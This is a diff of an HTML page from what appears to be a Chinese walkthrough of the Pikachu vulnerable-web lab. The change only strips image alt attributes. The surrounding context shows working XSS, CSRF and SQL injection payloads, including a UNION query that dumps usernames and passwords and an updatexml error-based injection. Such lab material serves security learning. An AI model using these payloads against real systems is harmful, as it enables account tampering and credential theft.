@@ -559,7 +559,7 @@ payload2<span class="token operator">:</span>
 <p>把href拼接掉弹个框试试</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#<span class="token string">' onclick=alert('</span>冲冲冲<span class="token string">') '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>在源码可以看到，闭合了href同时点击事件也被加了进去</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211090013242.png" alt="image-20210211090013242"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211090013242.png"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211085847943.png"></p>
 <h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>这题有点懵，看了下源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$message</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -605,7 +605,7 @@ payload2<span class="token operator">:</span>
 <h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>先登录进去</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211093728691.png"></p>
 <p>修改提交的时候抓包</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211094138876.png" alt="image-20210211094138876"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211094138876.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=111111&amp;add=CHINA&amp;email=lucy%40qq.com&amp;submit=submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>修URL然后发给别人，只要他在登录状态下点了这个链接，他的信息就被修改了</p>
 <h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>还是一样登录，修改信息，抓包。但这次修改信息是在一个POST表单里,不能直接改URL了</p>
@@ -689,7 +689,7 @@ id<span class="token operator">=</span><span class="token operator">-</span><spa
 
 <span class="token comment">#7.爆值</span>
 <span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214180536040.png" alt="image-20210214180536040"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214180536040.png"></p>
 <h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><blockquote>
 <p>到这里变量类型拼接类型多种多样，只要成功把闭合构造出来就行</p>
 </blockquote>
@@ -708,7 +708,7 @@ id<span class="token operator">=</span><span class="token operator">-</span><spa
 <pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'),'','','','')' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>试了几种常见的，发现报错注入可以</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Amy<span class="token string">' and updatexml(1,concat(0x7e,database()),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214185323297.png" alt="image-20210214185323297"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214185323297.png"></p>
 <h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><p>随便放点留言进去，根据题意</p>
 <p>点删除的时候抓包</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214190707576.png"></p>
